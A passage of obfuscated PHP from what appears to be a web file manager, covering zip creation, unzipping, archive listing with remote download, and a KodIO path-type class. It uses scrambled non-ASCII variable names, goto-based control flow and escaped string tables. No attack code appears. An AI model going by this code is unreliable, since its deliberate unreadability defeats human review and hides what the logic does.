REPEAT_RENAME) { goto fèÉ¹§ºî˜; A²ëÜãÎÚ„: if (!$E”åÁÃ«Ô•) { del_dir($dáÖøÉî ); show_json(LNG($dê¾–È¨¿®[1018]), !1); } del_dir($dáÖøÉî ); return $E”åÁÃ«Ô•; goto F…Ø¢ÖÁã£; F›Œ’™¾è: if (count($aÎÑºÃ²Ãã) > 1) { $b·Êùˆ”Å = IO::info(IO::pathFather($bâ†ÆğÇ¾®[$dê¾–È¨¿®[85]])); $aë½×ˆ’¾Â = $b·Êùˆ”Å[$dê¾–È¨¿®[38]]; } $a÷¬šùÌŒ = $dáÖøÉî ; if (!$a÷¬šùÌŒ) { $a÷¬šùÌŒ = get_path_father($bâ†ÆğÇ¾®[$dê¾–È¨¿®[85]]); if (!$e±ÏË’ÍÙ© && $A–ÛØßÑ´À->getType() == $dê¾–È¨¿®[112]) { $a÷¬šùÌŒ = get_path_father($A–ÛØßÑ´À->path); } $DÂ›‘’‡ÖÓ = IO::info($a÷¬šùÌŒ); if (!$DÂ›‘’‡ÖÓ[$dê¾–È¨¿®[203]]) { show_json(LNG($dê¾–È¨¿®[1017]), !1); } } goto CØÌÑ¤àâ’; a¼ÄÜíõ¤: foreach ($aÎÑºÃ²Ãã as $Fİè‚©¥ => $bäŸ¤—ÄÀß) { $aÎÑºÃ²Ãã[$Fİè‚©¥] = self::iconvSystem($bäŸ¤—ÄÀß); } KodArchive::create($f¼èòÆØğà, $aÎÑºÃ²Ãã); if (!IO::exist($f—ÇğìÔÏ)) { if ($dáÖøÉî ) { del_dir($dáÖøÉî ); } show_json(LNG($dê¾–È¨¿®[1018]), !1); } goto Eƒ”ƒ®Ì•´; fèÉ¹§ºî˜: $dê¾–È¨¿® =& $_SERVER[¨¤¼…´]; $A–ÛØßÑ´À = self::init($BÒ·óÒ©ÍŠ[0][$dê¾–È¨¿®[85]]); $bâ†ÆğÇ¾® = self::info($BÒ·óÒ©ÍŠ[0][$dê¾–È¨¿®[85]]); goto dÖáÙ–Õ¸; Eƒ”ƒ®Ì•´: if ($e±ÏË’ÍÙ© || !$dáÖøÉî ) { if ($dáÖøÉî  && strstr($dáÖøÉî , TEMP_FILES)) { $b¡”Ò…Àá = $aÎÑºÃ²Ãã = array(); recursion_dir($a÷¬šùÌŒ, $b¡”Ò…Àá, $aÎÑºÃ²Ãã, 0); foreach ($b¡”Ò…Àá as $BÁóÈ˜ö¹ô) { del_dir($BÁóÈ˜ö¹ô); } foreach ($aÎÑºÃ²Ãã as $B Î¯Úš×) { if ($B Î¯Úš× == $f¼èòÆØğà) { continue; } del_file($B Î¯Úš×); } } return $f—ÇğìÔÏ; } $dÕŸ¹Ïš™É = self::pathFather($bâ†ÆğÇ¾®[$dê¾–È¨¿®[85]]); $E”åÁÃ«Ô• = self::move($f—ÇğìÔÏ, $dÕŸ¹Ïš™É, $dª®ñè•Ø†); goto A²ëÜãÎÚ„; CØÌÑ¤àâ’: $f—ÇğìÔÏ = $a÷¬šùÌŒ . $aë½×ˆ’¾Â . $dê¾–È¨¿®[101] . $BÁ™ƒ†óÇê; $f—ÇğìÔÏ = get_filename_auto($f—ÇğìÔÏ, $dê¾–È¨¿®[43], $dª®ñè•Ø†); $f¼èòÆØğà = self::iconvSystem($f—ÇğìÔÏ); goto a¼ÄÜíõ¤; dÖáÙ–Õ¸: $dáÖøÉî  = !1; if (!$e±ÏË’ÍÙ© && $A–ÛØßÑ´À->getType() == $dê¾–È¨¿®[112]) { $aÎÑºÃ²Ãã = self::zipFileList($BÒ·óÒ©ÍŠ); } else { $dáÖøÉî  = $e±ÏË’ÍÙ© ? $e±ÏË’ÍÙ© : TEMP_FILES . $dê¾–È¨¿®[1016] . time() . rand_string(8) . $dê¾–È¨¿®[8]; mk_dir($dáÖøÉî ); $aÎÑºÃ²Ãã = self::zipFileList($BÒ·óÒ©ÍŠ, $dáÖøÉî ); } $aë½×ˆ’¾Â = $bâ†ÆğÇ¾®[$dê¾–È¨¿®[38]]; goto F›Œ’™¾è; F…Ø¢ÖÁã£: } public static function unzip($D´Ë¾ö¼÷í, $b«Áó…ÈàÂ = "\x72\x65\x70\154\x61\x63\145") { goto DËÑ‘™ƒ·; b’×¢¶å…ñ: return !0; goto F±À—¼´Ø‡; BÑÄòî’: if (!($FÍ†‘è¤¡º = parent::info($aìÅ†ï‘))) { show_json(LNG($Aİô‚„ëİ‘[1020]), !1); } if (!($eœÖ¯Ê°¡ = parent::infoFull($B³§÷ÜŞºœ))) { $B³§÷ÜŞºœ = parent::mkdir($B³§÷ÜŞºœ); $eœÖ¯Ê°¡ = array($Aİô‚„ëİ‘[85] => $B³§÷ÜŞºœ); } else { if (isset($eœÖ¯Ê°¡[$Aİô‚„ëİ‘[381]]) && trim($eœÖ¯Ê°¡[$Aİô‚„ëİ‘[85]], $Aİô‚„ëİ‘[8]) != trim($B³§÷ÜŞºœ, $Aİô‚„ëİ‘[8])) { $AÃÃİ¯Ÿ‡¡ = KodIO::make($eœÖ¯Ê°¡[$Aİô‚„ëİ‘[474]]); $Dã¨ğİÌô = parent::fileNameAuto($AÃÃİ¯Ÿ‡¡, $eœÖ¯Ê°¡[$Aİô‚„ëİ‘[38]], REPEAT_RENAME_FOLDER, !0); $B³§÷ÜŞºœ = parent::mkdir($AÃÃİ¯Ÿ‡¡ . $Dã¨ğİÌô); $eœÖ¯Ê°¡ = array($Aİô‚„ëİ‘[85] => $B³§÷ÜŞºœ); } } $B³§÷ÜŞºœ = $eœÖ¯Ê°¡[$Aİô‚„ëİ‘[85]]; goto CŞèÀÜ´ñ·; Bî™ßâ¹ÆÕ: Hook::trigger($Aİô‚„ëİ‘[1026], $Ağè†Ÿ‰Ú); recursion_dir($Ağè†Ÿ‰Ú, $b®ÉÖÊ¬®, $eÄå„©­´î, 0); $E¥¹ĞÚøÊ = array_merge($b®ÉÖÊ¬®, $eÄå„©­´î); goto aô›ô´”Ä; aÂøŒ¬‰î: mk_dir($Ağè†Ÿ‰Ú); $fŸÔ´’ïÁ’ = self::fileExt($FÍ†‘è¤¡º); $f¦‰½ì’äš = $Ağè†Ÿ‰Ú . $Aİô‚„ëİ‘[101] . $fŸÔ´’ïÁ’; goto dâ˜…‹øõ˜; DËÑ‘™ƒ·: $Aİô‚„ëİ‘ =& $_SERVER[¨¤¼…´]; $aìÅ†ï‘ = $D´Ë¾ö¼÷í[$Aİô‚„ëİ‘[85]]; $B³§÷ÜŞºœ = $D´Ë¾ö¼÷í[$Aİô‚„ëİ‘[1019]]; goto BÑÄòî’; dâ˜…‹øõ˜: if (!@file_exists(self::iconvSystem($f¦‰½ì’äš))) { $d÷Áó¯•ë½ = self::localFilePath($aìÅ†ï‘, $fŸÔ´’ïÁ’); $f¦‰½ì’äš = $d÷Áó¯•ë½ ? $d÷Áó¯•ë½ : parent::download($aìÅ†ï‘, $f¦‰½ì’äš); } $f¦‰½ì’äš = self::iconvSystem($f¦‰½ì’äš); $dÉ‹•Î¤Ø› = isset($D´Ë¾ö¼÷í[$Aİô‚„ëİ‘[1021]]) ? $D´Ë¾ö¼÷í[$Aİô‚„ëİ‘[1021]] : $Aİô‚„ëİ‘[1022]; goto c‹°µ£±; CŞèÀÜ´ñ·: $F²¼öµ¹† = self::tmpFileName($FÍ†‘è¤¡º); $Ağè†Ÿ‰Ú = TEMP_FILES . $F²¼öµ¹†; del_dir($Ağè†Ÿ‰Ú); goto aÂøŒ¬‰î; c‹°µ£±: $DãÃíÎ‡×” = KodArchive::extract($f¦‰½ì’äš, $Ağè†Ÿ‰Ú . $Aİô‚„ëİ‘[8], $dÉ‹•Î¤Ø›); self::archiveExt(); if (!$DãÃíÎ‡×”[$Aİô‚„ëİ‘[1023]]) { show_json($Aİô‚„ëİ‘[1024] . $DãÃíÎ‡×”[$Aİô‚„ëİ‘[1025]], !1); } goto Bî™ßâ¹ÆÕ; aô›ô´”Ä: foreach ($E¥¹ĞÚøÊ as $D®šçÛğÅ) { $D®šçÛğÅ = self::iconvApp($D®šçÛğÅ); self::move($D®šçÛğÅ, $B³§÷ÜŞºœ, $b«Áó…ÈàÂ); } del_dir($Ağè†Ÿ‰Ú); if (!$d÷Áó¯•ë½) { del_file($f¦‰½ì’äš); } goto b’×¢¶å…ñ; F±À—¼´Ø‡: } public static function unzipList($F‘Šèã÷”ì) { goto aÅˆ‰æİÒ­; c˜”‘Ú…èù: if (isset($c§¶»Ï¿ˆ)) { $ešŒ¡Ä§Ğ™ = array($c§¶»Ï¿ˆ[$FØ‚†ÜŒãá[85]], $c§¶»Ï¿ˆ[$FØ‚†ÜŒãá[1027]], $c§¶»Ï¿ˆ[$FØ‚†ÜŒãá[38]]); $e©Õ‚™Â†Ø = md5(implode($FØ‚†ÜŒãá[80], $ešŒ¡Ä§Ğ™)) . $FØ‚†ÜŒãá[101] . get_path_ext($c§¶»Ï¿ˆ[$FØ‚†ÜŒãá[38]]); } else { $ešŒ¡Ä§Ğ™ = array($B¥¢ßŠ·ñ–[$FØ‚†ÜŒãá[38]], $B¥¢ßŠ·ñ–[$FØ‚†ÜŒãá[85]], $B¥¢ßŠ·ñ–[$FØ‚†ÜŒãá[87]]); $e©Õ‚™Â†Ø = md5(implode($FØ‚†ÜŒãá[80], $ešŒ¡Ä§Ğ™)) . $FØ‚†ÜŒãá[101] . $f£µêƒ˜—è; } if ($eù–¼¸°ŸÔ == -1) { $d­°–‰ñ¨ = IO_PATH_SYSTEM_TEMP . "\172\151\160\x56\151\x65\167\57{$bš¼ì ç×}\57{$e©Õ‚™Â†Ø}\56\x6c\x6f\x67"; $AäŞøÈ˜ß = self::infoFull($d­°–‰ñ¨); if ($AäŞøÈ˜ß) { $d­°–‰ñ¨ = $AäŞøÈ˜ß[$FØ‚†ÜŒãá[85]]; $a×Ø‘Š•Í = self::getContent($d­°–‰ñ¨); if ($a×Ø‘Š•Í) { $EäæÀ‚¤ªø = json_decode($a×Ø‘Š•Í, !0); if (count($EäæÀ‚¤ªø) >= $B¢¦°‹à) { show_json(sprintf(LNG($FØ‚†ÜŒãá[1029]), count($EäæÀ‚¤ªø)), !1); } return $EäæÀ‚¤ªø; } } else { $d­°–‰ñ¨ = self::mkfile($d­°–‰ñ¨); } } $f²ˆ ©ƒºÑ = TEMP_FILES . $bš¼ì ç×; goto Eˆ³®ö‚ÙÊ; aÅˆ‰æİÒ­: $FØ‚†ÜŒãá =& $_SERVER[¨¤¼…´]; $EêœÎÀÇšÔ = $F‘Šèã÷”ì[$FØ‚†ÜŒãá[85]]; $eù–¼¸°ŸÔ = isset($F‘Šèã÷”ì[$FØ‚†ÜŒãá[1027]]) ? $F‘Šèã÷”ì[$FØ‚†ÜŒãá[1027]] : -1; goto aéŠÃ§ß§; cÕ‘“¸Ä»: $EäæÀ‚¤ªø = json_encode($B…¢ëÄÎÇ®[$FØ‚†ÜŒãá[1025]]); self::setContent($d­°–‰ñ¨, $EäæÀ‚¤ªø); if (count($B…¢ëÄÎÇ®[$FØ‚†ÜŒãá[1025]]) >= $B¢¦°‹à) { show_json(sprintf(LNG($FØ‚†ÜŒãá[1029]), count($B…¢ëÄÎÇ®[$FØ‚†ÜŒãá[1025]])), !1); } goto eÚ³Ü®ªì; DÕÍéîù›½: $BŠ¢£„«Ò§ = self::iconvSystem($BŠ¢£„«Ò§); if ($eù–¼¸°ŸÔ >= 0) { $BöÃæÍÃÂˆ = isset($F‘Šèã÷”ì[$FØ‚†ÜŒãá[1031]]) ? $F‘Šèã÷”ì[$FØ‚†ÜŒãá[1031]] : !1; $E·ÚµìäŠ— = isset($F‘Šèã÷”ì[$FØ‚†ÜŒãá[38]]) ? $F‘Šèã÷”ì[$FØ‚†ÜŒãá[38]] : $FØ‚†ÜŒãá[43]; KodArchive::filePreview($BŠ¢£„«Ò§, $eù–¼¸°ŸÔ, $BöÃæÍÃÂˆ, $E·ÚµìäŠ—); self::archiveExt(); die; } $B…¢ëÄÎÇ® = KodArchive::listContent($BŠ¢£„«Ò§); goto Aª–Áƒ¹®ß; Eˆ³®ö‚ÙÊ: if (!is_dir($f²ˆ ©ƒºÑ)) { mk_dir($f²ˆ ©ƒºÑ); } $BŠ¢£„«Ò§ = $f²ˆ ©ƒºÑ . $FØ‚†ÜŒãá[8] . $e©Õ‚™Â†Ø; if (!@file_exists(self::iconvSystem($BŠ¢£„«Ò§))) { if (isset($c§¶»Ï¿ˆ)) { url_request($EêœÎÀÇšÔ, $FØ‚†ÜŒãá[1030], $BŠ¢£„«Ò§); } else { $dóèâÆÉ = self::localFilePath($EêœÎÀÇšÔ, $f£µêƒ˜—è); $BŠ¢£„«Ò§ = $dóèâÆÉ ? $dóèâÆÉ : self::download($EêœÎÀÇšÔ, $BŠ¢£„«Ò§); } } goto DÕÍéîù›½; aéŠÃ§ß§: $B¢¦°‹à = 50000; if (request_url_safe($EêœÎÀÇšÔ)) { $c§¶»Ï¿ˆ = parse_url_query($EêœÎÀÇšÔ); if (!isset($c§¶»Ï¿ˆ[$FØ‚†ÜŒãá[85]])) { show_json($FØ‚†ÜŒãá[1028], !1); } } $EÑÀÀİ˜’· = isset($c§¶»Ï¿ˆ) ? $c§¶»Ï¿ˆ[$FØ‚†ÜŒãá[85]] : $EêœÎÀÇšÔ; goto cÊ‚ŞĞÊÔƒ; eÚ³Ü®ªì: return $B…¢ëÄÎÇ®[$FØ‚†ÜŒãá[1025]]; goto B“Î©£¤à§; Aª–Áƒ¹®ß: self::archiveExt(); del_dir($f²ˆ ©ƒºÑ); if (!$B…¢ëÄÎÇ®[$FØ‚†ÜŒãá[1023]]) { show_json($B…¢ëÄÎÇ®[$FØ‚†ÜŒãá[1025]], !1); } goto cÕ‘“¸Ä»; cÊ‚ŞĞÊÔƒ: $B¥¢ßŠ·ñ– = self::info($EÑÀÀİ˜’·); $f£µêƒ˜—è = self::fileExt($B¥¢ßŠ·ñ–); $bš¼ì ç× = self::tmpFileName($B¥¢ßŠ·ñ–); goto c˜”‘Ú…èù; B“Î©£¤à§: } private static function fileExt($FŸ¨Àî†Œ) { $cæ·ğË‹“ =& $_SERVER[¨¤¼…´]; $d›×¦„œÕ = $FŸ¨Àî†Œ[$cæ·ğË‹“[175]]; if ($d›×¦„œÕ == $cæ·ğË‹“[1032]) { $Fİí¬ÛöÓù = $cæ·ğË‹“[1033]; if (substr($FŸ¨Àî†Œ[$cæ·ğË‹“[38]], -strlen($Fİí¬ÛöÓù)) == $Fİí¬ÛöÓù) { $d›×¦„œÕ = $cæ·ğË‹“[1034]; } } self::archiveExt($d›×¦„œÕ); return $d›×¦„œÕ; } private static function zipFileList($cõàç”ãö¡, $aóåôò‘¦Ô = false) { $EÙ»÷Ñ¤µ =& $_SERVER[¨¤¼…´]; $cÁˆêäæ‘˜ = array(); foreach ($cõàç”ãö¡ as $Câ¹¢±ñ«‡) { $bÛ¥§Ö´§ê = $Câ¹¢±ñ«‡[$EÙ»÷Ñ¤µ[85]]; if ($aóåôò‘¦Ô) { $bÛ¥§Ö´§ê = self::copy($Câ¹¢±ñ«‡[$EÙ»÷Ñ¤µ[85]], $aóåôò‘¦Ô, $EÙ»÷Ñ¤µ[734]); } else { $F®¾¨ÈÈ‰¿ = self::init($Câ¹¢±ñ«‡[$EÙ»÷Ñ¤µ[85]]); if ($F®¾¨ÈÈ‰¿->getType() == $EÙ»÷Ñ¤µ[112]) { $bÛ¥§Ö´§ê = $F®¾¨ÈÈ‰¿->path; } } if ($bÛ¥§Ö´§ê && self::local()->exist($bÛ¥§Ö´§ê)) { $cÁˆêäæ‘˜[$Câ¹¢±ñ«‡[$EÙ»÷Ñ¤µ[85]]] = $bÛ¥§Ö´§ê; } } if (!empty($cÁˆêäæ‘˜)) { return array_values($cÁˆêäæ‘˜); } show_json(LNG($EÙ»÷Ñ¤µ[1000]), !1); } public static function tmpFileName($aèÇİÚÂ®·) { $B½ê»Õ˜¿ =& $_SERVER[¨¤¼…´]; $CÌÂÙ‚‚Œ = array($aèÇİÚÂ®·[$B½ê»Õ˜¿[38]], $aèÇİÚÂ®·[$B½ê»Õ˜¿[85]], $aèÇİÚÂ®·[$B½ê»Õ˜¿[87]], $aèÇİÚÂ®·[$B½ê»Õ˜¿[472]]); return md5(implode($B½ê»Õ˜¿[80], $CÌÂÙ‚‚Œ)); } private static function localFilePath($Bòß¨é½Í¯, $E‚ãªŠ®Šâ) { goto aÍŞÍË¸”²; D»¼”Åô•: if ($F©Ğİ¢Ğ‡ == $fØÊÇ¡Ô¶ô[112] || $F©Ğİ¢Ğ‡ == $fØÊÇ¡Ô¶ô[1038]) { if (!$AÂÕ‚´óÕ->exist($AÂÕ‚´óÕ->path)) { show_json(LNG($fØÊÇ¡Ô¶ô[111]), !1); } return $AÂÕ‚´óÕ->path; } return !1; goto Bƒª­Ê¿ˆ; bŠÊÉï¯ğ»: if ($d Èœ‡’ê’[$fØÊÇ¡Ô¶ô[39]] == KodIO::KOD_SOURCE) { $B‚®ùˆ‡Ò‡ = Model($fØÊÇ¡Ô¶ô[742])->fileInfoGet(KodIO::sourceID($Bòß¨é½Í¯)); if (!$B‚®ùˆ‡Ò‡[$fØÊÇ¡Ô¶ô[85]]) { show_json($fØÊÇ¡Ô¶ô[1037], !1); } $Bòß¨é½Í¯ = $B‚®ùˆ‡Ò‡[$fØÊÇ¡Ô¶ô[85]]; } $AÂÕ‚´óÕ = self::init($Bòß¨é½Í¯); $F©Ğİ¢Ğ‡ = $AÂÕ‚´óÕ->getType(); goto D»¼”Åô•; aÍŞÍË¸”²: $fØÊÇ¡Ô¶ô =& $_SERVER[¨¤¼…´]; if ($E‚ãªŠ®Šâ == $fØÊÇ¡Ô¶ô[1035] && strtoupper(substr(PHP_OS, 0, 3)) == $fØÊÇ¡Ô¶ô[1036]) { return !1; } $d Èœ‡’ê’ = KodIO::parse($Bòß¨é½Í¯); goto bŠÊÉï¯ğ»; Bƒª­Ê¿ˆ: } private static function archiveExt($AˆÇªìè = '') { $GLOBALS[$_SERVER[¨¤¼…´][1039]] = $AˆÇªìè; } } class KodIO { const KOD_SOURCE = "\x7b\x73\157\x75\162\x63\145\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\163\145\162\122\145\143\171\x63\x6c\x65\175"; const KOD_USER_FAV = "\x7b\165\163\x65\162\106\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\x65\162\x46\x69\154\x65\124\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\162\x46\x69\x6c\x65\124\171\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\157\x75\160\122\157\157\164\123\145\154\146\175"; const KOD_USER_SHARE = "\173\x75\163\145\x72\x53\x68\141\162\x65\175"; const KOD_USER_SHARE_LINK = "\173\x75\x73\x65\162\123\150\141\x72\x65\x4c\x69\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\150\x61\x72\145\x54\157\x4d\145\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\x68\141\x72\x65\x49\x74\x65\155\175"; const KOD_SHARE_LINK = "\173\x73\x68\141\x72\145\111\x74\x65\x6d\x4c\151\x6e\153\175"; const KOD_SEARCH = "\x7b\x73\145\x61\162\x63\150\x7d"; const KOD_BLOCK = "\173\x62\154\157\x63\153\175"; const KOD_IO = "\x7b\151\x6f\175"; const KOD_USER_RECENT = "\x7b\165\163\145\162\x52\145\156\143\x65\x6e\x74\175"; const KOD_USER_DRIVER = "\x7b\144\x72\x69\x76\145\162\175"; public static function typeList() { $eœ—™øÀƒ“ =& $_SERVER[¨¤¼…´]; return array($eœ—™øÀƒ“[1040] => self::KOD_SOURCE, $eœ—™øÀƒ“[1041] => self::KOD_USER_RECYCLE, $eœ—™øÀƒ“[1042] => self::KOD_USER_FAV, $eœ—™øÀƒ“[1043] => self::KOD_USER_FILE_TAG, $eœ—™øÀƒ“[1044] => self::KOD_USER_FILE_TYPE, $eœ—™øÀƒ“[1045] => self::KOD_GROUP_ROOT_SELF, $eœ—™øÀƒ“[1046] => self::KOD_USER_SHARE, $eœ—™øÀƒ“[1047] => self::KOD_USER_SHARE_LINK, $eœ—™øÀƒ“[1048] => self::KOD_USER_SHARE_TO_ME, $eœ—™øÀƒ“[1049] => self::KOD_SHARE_ITEM, $eœ—™øÀƒ“[1050] => self::KOD_SHARE_LINK, $eœ—™øÀƒ“[1051] => self::KOD_SEARCH, $eœ—™øÀƒ“[1052] => self::KOD_BLOCK, $eœ—™øÀƒ“[1053] => self::KOD_IO, $eœ—™øÀƒ“[1054] => self::KOD_USER_RECENT, $eœ—™øÀƒ“[1055] => self::KOD_USER_DRIVER); } public static function parse($dÓÌÓÄĞ¿) { goto FËó¸˜ŠÖ; Dà¶‘¨ˆ†: preg_match($bÏ¹˜ßôƒƒ[1056], $dÓÌÓÄĞ¿, $EˆˆÏï‚Ù); $D“Ïé™Ï = array($bÏ¹˜ßôƒƒ[400] => !1, $bÏ¹˜ßôƒƒ[1057] => !1, $bÏ¹˜ßôƒƒ[397] => !1, $bÏ¹˜ßôƒƒ[85] => $dÓÌÓÄĞ¿, $bÏ¹˜ßôƒƒ[1004] => !1, $bÏ¹˜ßôƒƒ[1003] => $bÏ¹˜ßôƒƒ[43]); if (is_array($EˆˆÏï‚Ù) && count($EˆˆÏï‚Ù) == 5) { $cñ™¶†åÌ¯ = $bÏ¹˜ßôƒƒ[1058] . $EˆˆÏï‚Ù[2] . $bÏ¹˜ßôƒƒ[328]; if (in_array($cñ™¶†åÌ¯, $Bß©¾œ…¹)) { $D“Ïé™Ï[$bÏ¹˜ßôƒƒ[1004]] = $EˆˆÏï‚Ù[1]; $D“Ïé™Ï[$bÏ¹˜ßôƒƒ[39]] = $cñ™¶†åÌ¯; $D“Ïé™Ï[$bÏ¹˜ßôƒƒ[1059]] = substr($cñ™¶†åÌ¯, 1, -1); $D“Ïé™Ï[$bÏ¹˜ßôƒƒ[379]] = $EˆˆÏï‚Ù[3]; } $D“Ïé™Ï[$bÏ¹˜ßôƒƒ[1003]] = $EˆˆÏï‚Ù[4]; } goto E‚³õ”îšê; FËó¸˜ŠÖ: $bÏ¹˜ßôƒƒ =& $_SERVER[¨¤¼…´]; $dÓÌÓÄĞ¿ = self::clear($dÓÌÓÄĞ¿); $Bß©¾œ…¹ = array_values(self::typeList()); goto Dà¶‘¨ˆ†; E‚³õ”îšê: $E³â—ÇñŞ  = array($bÏ¹˜ßôƒƒ[43], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $D“Ïé™Ï[$bÏ¹˜ßôƒƒ[1060]] = in_array($D“Ïé™Ï[$bÏ¹˜ßôƒƒ[39]], $E³â—ÇñŞ ); return $D“Ïé™Ï; goto fù‰ªåáõÀ; fù‰ªåáõÀ: } public static function clear($BœÓ¶£²²ë) { goto c‰ó¸•Ğô¥; A‹­‹ÚèŒÚ: $eï¾ãááÂµ = $C„ÈØÂ·Ë[1061]; if (substr($BœÓ¶£²²ë, 0, 3) == $C„ÈØÂ·Ë[1062]) { $BœÓ¶£²²ë = substr($BœÓ¶£²²ë, 3); } while (strstr($BœÓ¶£²²ë, $eï¾ãááÂµ)) { $BœÓ¶£²²ë = str_replace($eï¾ãááÂµ, $C„ÈØÂ·Ë[8], $BœÓ¶£²²ë); } goto fˆˆà‡ì„; c‰ó¸•Ğô¥: $C„ÈØÂ·Ë =& $_SERVER[¨¤¼…´]; $BœÓ¶£²²ë = str_replace(array($C„ÈØÂ·Ë[979], $C„ÈØÂ·Ë[14]), $C„ÈØÂ·Ë[60], $BœÓ¶£²²ë); $BœÓ¶£²²ë = str_replace($C„ÈØÂ·Ë[103], $C„ÈØÂ·Ë[8], $BœÓ¶£²²ë); goto A‹­‹ÚèŒÚ; f÷ŠÁØ“¢: return $BœÓ¶£²²ë; goto aµ©¶ÚéÑì; fˆˆà‡ì„: $BœÓ¶£²²ë = preg_replace($C„ÈØÂ·Ë[1063], $C„ÈØÂ·Ë[8], $BœÓ¶£²²ë); if ($BœÓ¶£²²ë == $C„ÈØÂ·Ë[8]) { return $C„ÈØÂ·Ë[8]; } $BœÓ¶£²²ë = rtrim($BœÓ¶£²²ë, $C„ÈØÂ·Ë[8]); goto f÷ŠÁØ“¢; aµ©¶ÚéÑì: } public static function sourceID($D‰ƒæÅ¤Ğ¾) { $Cù•Éˆ†˜ =& $_SERVER[¨¤¼…´]; $dÈœ¿•¢« = self::parse($D‰ƒæÅ¤Ğ¾); if ($dÈœ¿•¢«[$Cù•Éˆ†˜[39]] !== self::KOD_SOURCE) { show_json(LNG($Cù•Éˆ†˜[1064]), !1); } return $dÈœ¿•¢«[$Cù•Éˆ†˜[379]]; } public static function make($bò³¯íµ¨) { if (!$bò³¯íµ¨) { return !1; } return self::makePath(self::KOD_SOURCE, intval($bò³¯íµ¨)); } public static function makeShare($dÃãˆƒáà†, $Bİ†Ú±à‚í) { return self::makePath(self::KOD_SHARE_ITEM, $dÃãˆƒáà†, $Bİ†Ú±à‚í); } public static function makeFileTypePath($C—¼–Óˆöô) { return self::makePath(self::KOD_USER_FILE_TYPE, $C—¼–Óˆöô); } public static function makeFileTagPath($D·‚‰®¯§ ) { return self::makePath(self::KOD_USER_FILE_TAG, $D·‚‰®¯§ ); } public static function makePath($c‹ôØÕ‘ò¼, $D¶¤ÔÑ°Ëç = '', $Fç‰ä‘ÆÄ = '') { $B¿¼ğã Üğ =& $_SERVER[¨¤¼…´]; $C„óİÑÜµ´ = substr($c‹ôØÕ‘ò¼, 1, -1); $cçŒÚŠë´© = $B¿¼ğã Üğ[1065] . $C„óİÑÜµ´ . $B¿¼ğã Üğ[1066] . $D¶¤ÔÑ°Ëç . $B¿¼ğã Üğ[1067]; $cçŒÚŠë´© = $Fç‰ä‘ÆÄ ? $cçŒÚŠë´© . $Fç‰ä‘ÆÄ . $B¿¼ğã Üğ[8] : $cçŒÚŠë´©; return $cçŒÚŠë´©; } public static function hashPath($f©çëŞËÔ›) { $e¢à¶®‚õŞ =& $_SERVER[¨¤¼…´]; $f¡Û³†ØÔ› = is_array($f©çëŞËÔ›) ? $f©çëŞËÔ› : IO::info($f©çëŞËÔ›); $Eï®Åóßö‚ = _get($f¡Û³†ØÔ›, $e¢à¶®‚õŞ[1068], $e¢à¶®‚õŞ[43]); if (!$Eï®Åóßö‚) { $B„àµ¨¤Ù = KodIO::parse($f¡Û³†ØÔ›[$e¢à¶®‚õŞ[85]]); if (!$B„àµ¨¤Ù[$e¢à¶®‚õŞ[39]]) { $Eï®Åóßö‚ = IO::hashSimple($f¡Û³†ØÔ›[$e¢à¶®‚õŞ[85]]); } } if (!$Eï®Åóßö‚) { $Eï®Åóßö‚ = md5($f¡Û³†ØÔ›[$e¢à¶®‚õŞ[85]] . $f¡Û³†ØÔ›[$e¢à¶®‚õŞ[87]] . $f¡Û³†ØÔ›[$e¢à¶®‚õŞ[117]]); } return $Eï®Åóßö‚; } public static function initSystemPath() { $eäÊ±¢œ  =& $_SERVER[¨¤¼…´]; if (defined($eäÊ±¢œ [1069])) { return; } define($eäÊ±¢œ [1069], self::systemPath($eäÊ±¢œ [1070])); define($eäÊ±¢œ [1071], self::systemPath($eäÊ±¢œ [1072])); define($eäÊ±¢œ [1073], self::systemPath($eäÊ±¢œ [1074])); define($eäÊ±¢œ [1075], self::systemPath($eäÊ±¢œ [1076])); } public static function systemPath($f‚—Ÿ÷×†) { goto EÎîšÈ¡«Ï; dôíÀÙÉÂÃ: if ($fßÖŞ…’¿) { return $fßÖŞ…’¿; } if ($f‚—Ÿ÷×† == $C½çâÕ‘Í[1070]) { $fßÖŞ…’¿ = self::make(Model($C½çâÕ‘Í[742])->systemRootPathAdd($C½çâÕ‘Í[1079])); } else { $fßÖŞ…’¿ = self::systemPath($C½çâÕ‘Í[1070]); $Cïò™ŒÌôÔ = self::sourceID($fßÖŞ…’¿); $fßÖŞ…’¿ = self::make(Model($C½çâÕ‘Í[742])->mkdir($Cïò™ŒÌôÔ, $f‚—Ÿ÷×†)); } Model($C½çâÕ‘Í[1078])->set($A†«´Ê‹ê³, $fßÖŞ…’¿); goto FÄîÔ×ÂÄÃ; EÎîšÈ¡«Ï: $C½çâÕ‘Í =& $_SERVER[¨¤¼…´]; $A†«´Ê‹ê³ = $C½çâÕ‘Í[1077] . ucfirst($f‚—Ÿ÷×†); $fßÖŞ…’¿ = Model($C½çâÕ‘Í[1078])->get($A†«´Ê‹ê³); goto dôíÀÙÉÂÃ; FÄîÔ×ÂÄÃ: return $fßÖŞ…’¿; goto EÕ¨¶â¬á‹; EÕ¨¶â¬á‹: } public static function systemFolder($AÔàá‚µ¡À) { $BŠöŒ¡öùƒ = IO_PATH_SYSTEM_SOURCE . $AÔàá‚µ¡À; $e»œÙˆÁ¥ = Cache::get($BŠöŒ¡öùƒ); if (!$e»œÙˆÁ¥) { $d¬¶áĞÓÜÂ = IO::infoFull($BŠöŒ¡öùƒ); if (!$d¬¶áĞÓÜÂ) { $e»œÙˆÁ¥ = IO::mkdir($BŠöŒ¡öùƒ, REPEAT_SKIP); } else { $e»œÙˆÁ¥ = $d¬¶áĞÓÜÂ[$_SERVER[¨¤¼…´][85]]; } Cache::set($BŠöŒ¡öùƒ, $e»œÙˆÁ¥, 3600 * 10); } return $e»œÙˆÁ¥; } public static function defaultDriver() { return Model($_SERVER[¨¤¼…´][693])->defaultDriver(); } public static function defaultIO() { $fê†Ú†àä™ =& $_SERVER[¨¤¼…´]; $aê…–õİ³Â = self::defaultDriver(); return $fê†Ú†àä™[1080] . $aê…–õİ³Â[$fê†Ú†àä™[379]] . $fê†Ú†àä™[1067]; } public static function defaultDriverInit() { static $Cöƒ›Ëœé¼ = false; if 